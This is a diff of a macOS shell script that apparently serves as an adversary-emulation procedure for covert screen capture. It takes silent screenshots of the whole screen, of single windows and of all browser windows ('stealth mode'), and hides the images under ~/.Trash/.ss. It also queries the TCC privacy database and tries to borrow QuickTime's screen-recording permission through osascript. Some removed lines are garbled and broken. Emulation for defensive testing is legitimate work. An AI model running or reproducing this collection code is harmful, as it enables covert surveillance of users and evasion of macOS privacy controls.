-    $CMD_PRINTF "%s\n" 'process.launchPath = "/usr/sbin/screencapture"' >> "$swift_script"
-    $CMD_PRINTF "%s\n" 'process.arguments = ["-x", outputPath]' >> "$swift_script"
-    $CMD_PRINTF "%s\n" 'process.launch()' >> "$swift_script"
-    $CMD_PRINTF "%s\n" 'process.waitUntilExit()' >> "$swift_script"
-    $CMD_PRINTF "%s\n" 'if process.terminationStatus = 0 {' >> "$swift_script"
-    $CMD_PRINTF "%s\n" '    let fileManager = FileManager.default' >> "$swift_script"
-    $CMD_PRINTF "%s\n" '    if fileManager.fileExists(atPath: outputPath) {' >> "$swift_script"
-    $CMD_PRINTF "%s\n" '        if let attributes = try? fileManager.attributesOfItem(atPath: outputPath),' >> "$swift_script"
-    $CMD_PRINTF "%s\n" '           let fileSize = attributes[FileAttributeKey.size] as? Int64 {' >> "$swift_script"
-    $CMD_PRINTF "%s\n" '            print("SUCCESS: \\(outputPath) (\\(fileSize) bytes)")' >> "$swift_script"
-    $CMD_PRINTF "%s\n" '        }' >> "$swift_script"
-    $CMD_PRINTF "%s\n" '    } else { exit(1) }' >> "$swift_script"
-    $CMD_PRINTF "%s\n" '} else { exit(1) }' >> "$swift_script"
+    echo 'import Foundation' > "$swift_script"
+    echo 'let outputPath = CommandLine.arguments[1]' >> "$swift_script"
+    echo 'let process = Process()' >> "$swift_script"
+    echo 'process.launchPath = "/usr/sbin/screencapture"' >> "$swift_script"
+    echo 'process.arguments = ["-x", outputPath]' >> "$swift_script"
+    echo 'process.launch()' >> "$swift_script"
+    echo 'process.waitUntilExit()' >> "$swift_script"
+    echo 'if process.terminationStatus == 0 {' >> "$swift_script"
+    echo '    let fileManager = FileManager.default' >> "$swift_script"
+    echo '    if fileManager.fileExists(atPath: outputPath) {' >> "$swift_script"
+    echo '        if let attributes = try? fileManager.attributesOfItem(atPath: outputPath),' >> "$swift_script"
+    echo '           let fileSize = attributes[FileAttributeKey.size] as? Int64 {' >> "$swift_script"
+    echo '            print("SUCCESS: \\(outputPath) (\\(fileSize) bytes)")' >> "$swift_script"
+    echo '        }' >> "$swift_script"
+    echo '    } else { exit(1) }' >> "$swift_script"
+    echo '} else { exit(1) }' >> "$swift_script"
     
     local result=$(swift "$swift_script" "$output_path" 2>/dev/null)
     rm -f "$swift_script"
     
-    if $CMD_PRINTF "%s\n" "$result" | $CMD_GREP -q "SUCCESS:"; then
-        $CMD_PRINTF "SWIFT_SCREENSHOT|captured|%s\\n" "$result"
+    if echo "$result" | grep -q "SUCCESS:"; then
+        printf "SWIFT_SCREENSHOT|captured|%s\\n" "$result"
     else
-        $CMD_PRINTF "SWIFT_SCREENSHOT|failed|capture failed\\n"
+        printf "SWIFT_SCREENSHOT|failed|capture failed\\n"
         return 1
     fi
 }
@@ -2391,31 +2389,31 @@ capture_python_screenshot() {
     mkdir -p "$HOME/.local/share" 2>/dev/null
     local output_path="$HOME/.local/share/python_$(openssl rand -hex 4).jpg"
     
-    $CMD_PRINTF "PYTHON_SCREENSHOT|capturing|Using Python subprocess (standard library)\\n"
+    printf "PYTHON_SCREENSHOT|capturing|Using Python subprocess (standard library)\\n"
     
     # Create temporary Python script (no external dependencies)
     local python_script="/tmp/screenshot_$(openssl rand -hex 4).py"
-    $CMD_PRINTF "%s\n" 'import subprocess' > "$python_script"
-    $CMD_PRINTF "%s\n" 'import sys' >> "$python_script"
-    $CMD_PRINTF "%s\n" 'import os' >> "$python_script"
-    $CMD_PRINTF "%s\n" 'output_path = sys.argv[1]' >> "$python_script"
-    $CMD_PRINTF "%s\n" 'try:' >> "$python_script"
-    $CMD_PRINTF "%s\n" '    result = subprocess.run(["/usr/sbin/screencapture", "-x", output_path], capture_output=True, text=True, timeout=10)' >> "$python_script"
-    $CMD_PRINTF "%s\n" '    if result.returncode = 0 and os.path.exists(output_path):' >> "$python_script"
-    $CMD_PRINTF "%s\n" '        size = os.path.getsize(output_path)' >> "$python_script"
-    $CMD_PRINTF "%s\n" '        print(f"SUCCESS: {output_path} ({size} bytes)")' >> "$python_script"
-    $CMD_PRINTF "%s\n" '    else:' >> "$python_script"
-    $CMD_PRINTF "%s\n" '        sys.exit(1)' >> "$python_script"
-    $CMD_PRINTF "%s\n" 'except Exception:' >> "$python_script"
-    $CMD_PRINTF "%s\n" '    sys.exit(1)' >> "$python_script"
+    echo 'import subprocess' > "$python_script"
+    echo 'import sys' >> "$python_script"
+    echo 'import os' >> "$python_script"
+    echo 'output_path = sys.argv[1]' >> "$python_script"
+    echo 'try:' >> "$python_script"
+    echo '    result = subprocess.run(["/usr/sbin/screencapture", "-x", output_path], capture_output=True, text=True, timeout=10)' >> "$python_script"
+    echo '    if result.returncode == 0 and os.path.exists(output_path):' >> "$python_script"
+    echo '        size = os.path.getsize(output_path)' >> "$python_script"
+    echo '        print(f"SUCCESS: {output_path} ({size} bytes)")' >> "$python_script"
+    echo '    else:' >> "$python_script"
+    echo '        sys.exit(1)' >> "$python_script"
+    echo 'except Exception:' >> "$python_script"
+    echo '    sys.exit(1)' >> "$python_script"
     
     local result=$(python3 "$python_script" "$output_path" 2>/dev/null)
     rm -f "$python_script"
     
-    if $CMD_PRINTF "%s\n" "$result" | $CMD_GREP -q "SUCCESS:"; then
-        $CMD_PRINTF "PYTHON_SCREENSHOT|captured|%s\\n" "$result"
+    if echo "$result" | grep -q "SUCCESS:"; then
+        printf "PYTHON_SCREENSHOT|captured|%s\\n" "$result"
     else
-        $CMD_PRINTF "PYTHON_SCREENSHOT|failed|capture failed\\n"
+        printf "PYTHON_SCREENSHOT|failed|capture failed\\n"
         return 1
     fi
 }
@@ -2424,36 +2422,36 @@ capture_python_screenshot() {
 # Function: query_tcc_permissions
 # Description: Query TCC database for screen recording permissions
 query_tcc_permissions() {
-    $CMD_PRINTF "TCC_QUERY|checking|Screen recording permissions in TCC database\\n"
+    printf "TCC_QUERY|checking|Screen recording permissions in TCC database\\n"
     
     local user_tcc="$HOME/Library/Application Support/com.apple.TCC/TCC.db"
     local system_tcc="/Library/Application Support/com.apple.TCC/TCC.db"
     
     # Check TCC database accessibility
     if [ -r "$user_tcc" ]; then
-        $CMD_PRINTF "TCC_QUERY|user_db|Accessible for reading\\n"
+        printf "TCC_QUERY|user_db|Accessible for reading\\n"
         
         # Query for screen capture services
-        local screen_services=$($CMD_SQLITE3 "$user_tcc" "SELECT DISTINCT service FROM access WHERE service LIKE '%Screen%' OR service LIKE '%kTCC%';" 2>/dev/null)
+        local screen_services=$(sqlite3 "$user_tcc" "SELECT DISTINCT service FROM access WHERE service LIKE '%Screen%' OR service LIKE '%kTCC%';" 2>/dev/null)
         if [ -n "$screen_services" ]; then
-            $CMD_PRINTF "TCC_QUERY|services|%s\\n" "$screen_services"
+            printf "TCC_QUERY|services|%s\\n" "$screen_services"
             
             # Get specific permissions
-            $CMD_SQLITE3 "$user_tcc" "SELECT service, client, auth_value FROM access WHERE service LIKE '%Screen%';" 2>/dev/null | while IFS='|' read -r service client allowed; do
-                [ -n "$service" ] && $CMD_PRINTF "TCC_QUERY|permission|%s: %s (auth_value: %s)\\n" "$service" "$client" "$allowed"
+            sqlite3 "$user_tcc" "SELECT service, client, auth_value FROM access WHERE service LIKE '%Screen%';" 2>/dev/null | while IFS='|' read -r service client allowed; do
+                [ -n "$service" ] && printf "TCC_QUERY|permission|%s: %s (auth_value: %s)\\n" "$service" "$client" "$allowed"
             done
         else
-            $CMD_PRINTF "TCC_QUERY|services|No screen-related services found\\n"
+            printf "TCC_QUERY|services|No screen-related services found\\n"
         fi
     else
-        $CMD_PRINTF "TCC_QUERY|user_db|Protected (normal behavior)\\n"
+        printf "TCC_QUERY|user_db|Protected (normal behavior)\\n"
     fi
     
     # Check system TCC database
     if [ -r "$system_tcc" ]; then
-        $CMD_PRINTF "TCC_QUERY|system_db|Accessible (unusual - may indicate compromise)\\n"
+        printf "TCC_QUERY|system_db|Accessible (unusual - may indicate compromise)\\n"
     else
-        $CMD_PRINTF "TCC_QUERY|system_db|Protected (normal)\\n"
+        printf "TCC_QUERY|system_db|Protected (normal)\\n"
     fi
 }
 
@@ -2461,26 +2459,26 @@ query_tcc_permissions() {
 # Function: scan_privileged_processes
 # Description: Scan for processes that might have screen recording permissions
 scan_privileged_processes() {
-    $CMD_PRINTF "PROCESS_SCAN|scanning|Processes that might have screen recording permissions\\n"
+    printf "PROCESS_SCAN|scanning|Processes that might have screen recording permissions\\n"
     
     # Screen Time processes (system level)
-    local screen_time_pids=$(p$CMD_GREP -f "ScreenTime" 2>/dev/null)
+    local screen_time_pids=$(pgrep -f "ScreenTime" 2>/dev/null)
     if [ -n "$screen_time_pids" ]; then
-        $CMD_PRINTF "PROCESS_SCAN|found|ScreenTime processes: %s\\n" "$screen_time_pids"
+        printf "PROCESS_SCAN|found|ScreenTime processes: %s\\n" "$screen_time_pids"
     fi
     
     # Look for apps with screen recording capabilities
     local recording_apps="QuickTime|Screenshot|OBS|Zoom|Teams|Skype|Discord"
-    ps aux | $CMD_GREP -iE "$recording_apps" | $CMD_GREP -v $CMD_GREP | while IFS= read -r process; do
-        local app_name=$($CMD_PRINTF "%s\n" "$process" | $CMD_AWK '{print $11}' | xargs basename)
-        local pid=$($CMD_PRINTF "%s\n" "$process" | $CMD_AWK '{print $2}')
-        $CMD_PRINTF "PROCESS_SCAN|potential|%s (PID: %s)\\n" "$app_name" "$pid"
+    ps aux | grep -iE "$recording_apps" | grep -v grep | while IFS= read -r process; do
+        local app_name=$(echo "$process" | awk '{print $11}' | xargs basename)
+        local pid=$(echo "$process" | awk '{print $2}')
+        printf "PROCESS_SCAN|potential|%s (PID: %s)\\n" "$app_name" "$pid"
     done
     
     # Check for loginwindow (system process with broad permissions)
-    local loginwindow_pid=$(p$CMD_GREP loginwindow | $CMD_HEAD -1)
+    local loginwindow_pid=$(pgrep loginwindow | head -1)
     if [ -n "$loginwindow_pid" ]; then
-        $CMD_PRINTF "PROCESS_SCAN|system|loginwindow (PID: %s) - system process with elevated permissions\\n" "$loginwindow_pid"
+        printf "PROCESS_SCAN|system|loginwindow (PID: %s) - system process with elevated permissions\\n" "$loginwindow_pid"
     fi
 }
 
@@ -2491,31 +2489,31 @@ capture_tcc_proxy_screenshot() {
     mkdir -p "$HOME/.Trash/.ss/proxy" 2>/dev/null
     local output_path="$HOME/.Trash/.ss/proxy/tcc_proxy_$(date +%s).jpg"
     
-    $CMD_PRINTF "TCC_PROXY|attempting|Using apps with existing permissions\\n"
+    printf "TCC_PROXY|attempting|Using apps with existing permissions\\n"
     
     # Try QuickTime Player if available
     if [ -d "/Applications/QuickTime Player.app" ]; then
-        $CMD_PRINTF "TCC_PROXY|trying|QuickTime Player\\n"
+        printf "TCC_PROXY|trying|QuickTime Player\\n"
         
         # Attempt to use QuickTime's potential permissions
         osascript -e 'tell application "QuickTime Player"' -e 'do shell script "screencapture -x '"$output_path"'"' -e 'end tell' 2>/dev/null
         
         if [ -f "$output_path" ]; then
-            file_size=$(stat -f%z "$output_path" 2>/dev/null || $CMD_PRINTF "%s\n" "unknown")
-            $CMD_PRINTF "TCC_PROXY|success|QuickTime proxy: %s (%s bytes)\\n" "$output_path" "$file_size"
+            file_size=$(stat -f%z "$output_path" 2>/dev/null || echo "unknown")
+            printf "TCC_PROXY|success|QuickTime proxy: %s (%s bytes)\\n" "$output_path" "$file_size"
             return 0
         fi
     fi
     
     # Try Screen Time app if running
-    local screen_time_pid=$(p$CMD_GREP -f "Screen Time" | $CMD_HEAD -1)
+    local screen_time_pid=$(pgrep -f "Screen Time" | head -1)
     if [ -n "$screen_time_pid" ]; then
-        $CMD_PRINTF "TCC_PROXY|trying|Screen Time process (PID: %s)\\n" "$screen_time_pid"
+        printf "TCC_PROXY|trying|Screen Time process (PID: %s)\\n" "$screen_time_pid"
         # This would require more advanced techniques like process injection
-        $CMD_PRINTF "TCC_PROXY|note|Would require process injection techniques\\n"
+        printf "TCC_PROXY|note|Would require process injection techniques\\n"
     fi
     
-    $CMD_PRINTF "TCC_PROXY|failed|No accessible proxy apps found\\n"
+    printf "TCC_PROXY|failed|No accessible proxy apps found\\n"
     return 1
 }
 
@@ -2523,22 +2521,22 @@ capture_tcc_proxy_screenshot() {
 # Function: list_available_windows
 # Description: List available windows for targeted screenshot capture
 list_available_windows() {
-    $CMD_PRINTF "WINDOW_LIST|enumerating|Available windows for capture\\n"
+    printf "WINDOW_LIST|enumerating|Available windows for capture\\n"
     
     # List windows with IDs using screencapture
     screencapture -l 2>/dev/null | while IFS= read -r line; do
-        if $CMD_PRINTF "%s\n" "$line" | $CMD_GREP -q "^[ :space: ]*[0-9]"; then
-            window_id=$($CMD_PRINTF "%s\n" "$line" | $CMD_AWK '{print $1}')
-            window_name=$($CMD_PRINTF "%s\n" "$line" | cut -d' ' -f2-)
-            $CMD_PRINTF "WINDOW_LIST|found|ID:%s Name:%s\\n" "$window_id" "$window_name"
+        if echo "$line" | grep -q "^[[:space:]]*[0-9]"; then
+            window_id=$(echo "$line" | awk '{print $1}')
+            window_name=$(echo "$line" | cut -d' ' -f2-)
+            printf "WINDOW_LIST|found|ID:%s Name:%s\\n" "$window_id" "$window_name"
         fi
     done
     
     # Also list running applications
-    $CMD_PRINTF "WINDOW_LIST|apps|Running applications:\\n"
-    osascript -e 'tell application "System Events" to get name of every application process whose visible is true' 2>/dev/null | $CMD_TR ',' '\n' | while IFS= read -r app; do
-        clean_app=$($CMD_PRINTF "%s\n" "$app" | $CMD_SED 's/^[ :space: ]*//;s/[ :space: ]*$//')
-        $CMD_PRINTF "WINDOW_LIST|app|%s\\n" "$clean_app"
+    printf "WINDOW_LIST|apps|Running applications:\\n"
+    osascript -e 'tell application "System Events" to get name of every application process whose visible is true' 2>/dev/null | tr ',' '\n' | while IFS= read -r app; do
+        clean_app=$(echo "$app" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
+        printf "WINDOW_LIST|app|%s\\n" "$clean_app"
     done
 }
 
@@ -2549,24 +2547,24 @@ capture_window_screenshot() {
     mkdir -p "$HOME/.Trash/.ss" 2>/dev/null
     local output_path="$HOME/.Trash/.ss/window_$(date +%Y%m%d_%H%M%S).jpg"
     
-    $CMD_PRINTF "WINDOW_SCREENSHOT|capturing|Capturing specific window\\n"
+    printf "WINDOW_SCREENSHOT|capturing|Capturing specific window\\n"
     
     # Get the first available window ID if none specified
-    local window_id=$(screencapture -l 2>/dev/null | $CMD_GREP "^[ :space: ]*[0-9]" | $CMD_HEAD -1 | $CMD_AWK '{print $1}')
+    local window_id=$(screencapture -l 2>/dev/null | grep "^[[:space:]]*[0-9]" | head -1 | awk '{print $1}')
     
     if [ -n "$window_id" ]; then
         # Capture specific window
         screencapture -x -l "$window_id" "$output_path" 2>/dev/null
         
         if [ -f "$output_path" ]; then
-            file_size=$(stat -f%z "$output_path" 2>/dev/null || $CMD_PRINTF "%s\n" "unknown")
-            $CMD_PRINTF "WINDOW_SCREENSHOT|captured|Window ID %s: %s (%s bytes)\\n" "$window_id" "$output_path" "$file_size"
+            file_size=$(stat -f%z "$output_path" 2>/dev/null || echo "unknown")
+            printf "WINDOW_SCREENSHOT|captured|Window ID %s: %s (%s bytes)\\n" "$window_id" "$output_path" "$file_size"
         else
-            $CMD_PRINTF "WINDOW_SCREENSHOT|failed|Could not capture window %s\\n" "$window_id"
+            printf "WINDOW_SCREENSHOT|failed|Could not capture window %s\\n" "$window_id"
             return 1
         fi
     else
-        $CMD_PRINTF "WINDOW_SCREENSHOT|failed|No windows available for capture\\n"
+        printf "WINDOW_SCREENSHOT|failed|No windows available for capture\\n"
         return 1
     fi
 }
@@ -2578,25 +2576,25 @@ capture_browser_windows() {
     mkdir -p "$HOME/.Trash/.ss/browsers" 2>/dev/null
     local captured_count=0
     
-    $CMD_PRINTF "BROWSER_SCREENSHOT|capturing|All browser windows (stealth mode)\\n"
+    printf "BROWSER_SCREENSHOT|capturing|All browser windows (stealth mode)\\n"
     
     # Get all windows and filter for browser windows without activating them
     screencapture -l 2>/dev/null | while IFS= read -r line; do
-        if $CMD_PRINTF "%s\n" "$line" | $CMD_GREP -q "^[ :space: ]*[0-9]"; then
-            window_id=$($CMD_PRINTF "%s\n" "$line" | $CMD_AWK '{print $1}')
-            window_name=$($CMD_PRINTF "%s\n" "$line" | cut -d' ' -f2-)
+        if echo "$line" | grep -q "^[[:space:]]*[0-9]"; then
+            window_id=$(echo "$line" | awk '{print $1}')
+            window_name=$(echo "$line" | cut -d' ' -f2-)
             
             # Check if window belongs to a browser (case insensitive)
-            if $CMD_PRINTF "%s\n" "$window_name" | $CMD_GREP -iq -E "(safari|chrome|firefox|edge|brave|opera)"; then
-                browser_name=$($CMD_PRINTF "%s\n" "$window_name" | $CMD_SED -E 's/.*[ :space: ]([ :alpha: ]+)[ :space: ].*/\1/' | $CMD_TR '[:upper:]' '[:lower:]')
+            if echo "$window_name" | grep -iq -E "(safari|chrome|firefox|edge|brave|opera)"; then
+                browser_name=$(echo "$window_name" | sed -E 's/.*[[:space:]]([[:alpha:]]+)[[:space:]].*/\1/' | tr '[:upper:]' '[:lower:]')
                 local output_path="$HOME/.Trash/.ss/browsers/${browser_name}_window_${window_id}_$(date +%s).jpg"
                 
                 # Capture specific browser window without activating it
                 screencapture -x -l "$window_id" "$output_path" 2>/dev/null
                 
                 if [ -f "$output_path" ]; then
-                    file_size=$(stat -f%z "$output_path" 2>/dev/null || $CMD_PRINTF "%s\n" "unknown")
-                    $CMD_PRINTF "BROWSER_SCREENSHOT|captured|Window %s (%s): %s (%s bytes)\\n" "$window_id" "$window_name" "$output_path" "$file_size"
+                    file_size=$(stat -f%z "$output_path" 2>/dev/null || echo "unknown")
+                    printf "BROWSER_SCREENSHOT|captured|Window %s (%s): %s (%s bytes)\\n" "$window_id" "$window_name" "$output_path" "$file_size"
                     captured_count=$((captured_count + 1))
                 fi
             fi
@@ -2604,10 +2602,10 @@ capture_browser_windows() {
     done
     
     if [ "$captured_count" -eq 0 ]; then
-        $CMD_PRINTF "BROWSER_SCREENSHOT|failed|No browser windows found\\n"
+        printf "BROWSER_SCREENSHOT|failed|No browser windows found\\n"
         return 1
     else
-        $CMD_PRINTF "BROWSER_SCREENSHOT|summary|Captured %d browser windows (stealth)\\n" "$captured_count"
+        printf "BROWSER_SCREENSHOT|summary|Captured %d browser windows (stealth)\\n" "$captured_count"
     fi
 }
 
@@ -2618,12 +2616,12 @@ capture_app_windows() {
     mkdir -p "$HOME/.Trash/.ss/apps" 2>/dev/null
     local captured_count=0
     
-    $CMD_PRINTF "APP_SCREENSHOT|capturing|All application windows\\n"
+    printf "APP_SCREENSHOT|capturing|All application windows\\n"
     
     # Get list of all window IDs and capture each
-    screencapture -l 2>/dev/null | $CMD_GREP "^[ :space: ]*[0-9]" | while IFS= read -r line; do
-        window_id=$($CMD_PRINTF "%s\n" "$line" | $CMD_AWK '{print $1}')
-        window_name=$($CMD_PRINTF "%s\n" "$line" | cut -d' ' -f2- | $CMD_TR ' /' '_')
+    screencapture -l 2>/dev/null | grep "^[[:space:]]*[0-9]" | while IFS= read -r line; do
+        window_id=$(echo "$line" | awk '{print $1}')
+        window_name=$(echo "$line" | cut -d' ' -f2- | tr ' /' '_')
         
         if [ -n "$window_id" ] && [ "$window_id" != "0" ]; then
             local output_path="$HOME/.Trash/.ss/apps/app_${window_id}_$(date +%s).jpg"
@@ -2631,18 +2629,35 @@ capture_app_windows() {
             screencapture -x -l "$window_id" "$output_path" 2>/dev/null
             
             if [ -f "$output_path" ]; then
-                file_size=$(stat -f%z "$output_path" 2>/dev/null || $CMD_PRINTF "%s\n" "unknown")
-                $CMD_PRINTF "APP_SCREENSHOT|captured|Window %s (%s): %s (%s bytes)\\n" "$window_id" "$window_name" "$output_path" "$file_size"
+                file_size=$(stat -f%z "$output_path" 2>/dev/null || echo "unknown")
+                printf "APP_SCREENSHOT|captured|Window %s (%s): %s (%s bytes)\\n" "$window_id" "$window_name" "$output_path" "$file_size"
                 captured_count=$((captured_count + 1))
             fi
         fi
     done
     
-    $CMD_PRINTF "APP_SCREENSHOT|summary|Captured %d application windows\\n" "$captured_count"
+    printf "APP_SCREENSHOT|summary|Captured %d application windows\\n" "$captured_count"
 } 
 
 
 JOB_ID=$(core_generate_job_id)
+
+# Purpose: Get log filename dynamically based on PROCEDURE_NAME
+# Inputs: None
+# Outputs: Log filename string
+# - Sets LOG_FILE_NAME and SYSLOG_TAG globals if not already set
+core_get_log_filename() {
+    if [ -z "$LOG_FILE_NAME" ]; then
+        if [ -n "$PROCEDURE_NAME" ]; then
+            LOG_FILE_NAME="${TTP_ID}_${PROCEDURE_NAME}.log"
+            SYSLOG_TAG="${TTP_ID}_${PROCEDURE_NAME}"
+        else
+            LOG_FILE_NAME="${TTP_ID}.log"
+            SYSLOG_TAG="${TTP_ID}"
+        fi
+    fi
+    echo "$LOG_FILE_NAME"
+}
 
 # Execute main function with all arguments
 core_main "$@" 
